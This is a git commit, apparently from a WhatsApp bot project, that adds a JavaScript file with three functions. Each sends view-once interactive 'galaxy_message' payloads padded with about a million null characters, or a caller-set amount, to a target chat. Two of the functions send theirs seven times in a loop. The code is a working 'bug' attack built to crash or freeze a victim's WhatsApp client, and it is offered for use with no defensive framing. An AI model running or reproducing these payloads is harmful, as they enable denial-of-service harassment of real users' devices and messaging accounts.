6c99645806466f7507241603f3bd58bdb3faad9d
Iconic tech ♻️ <iconictech2005@gmail.com>
2025-06-28 01:21:31 +0200

    Developed by iconic tech 😍

---
+++ system/hdr.js
@@ -0,0 +1,73 @@
+exports.beta2 = async (bad, X) => {
+    for (let i = 0; i < 7; i++) {
+        await bad.relayMessage(X, 
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "",
+                                format: "EXTENSIONS_1"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: 'galaxy_message',
+                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }, 
+            { participant: { jid: X } }
+        );
+    }
+}
+
+
+exports.beta1 = async (bad, X) => {
+    for (let i = 0; i < 7; i++) {
+        await bad.relayMessage(X, 
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "",
+                                format: "EXTENSIONS_1"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: 'galaxy_message',
+                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@badtzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }, 
+            { participant: { jid: X } }
+        );
+    }
+}
+
+exports.buk1 = async (bad, X, text, amount, ptcp = false) => {
+    await bad.relayMessage(X, 
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: text,
+                            format: "EXTENSIONS_1"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: 'galaxy_message',
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, 
+        ptcp ? { participant: { jid: X } } : {}
+    );
+};
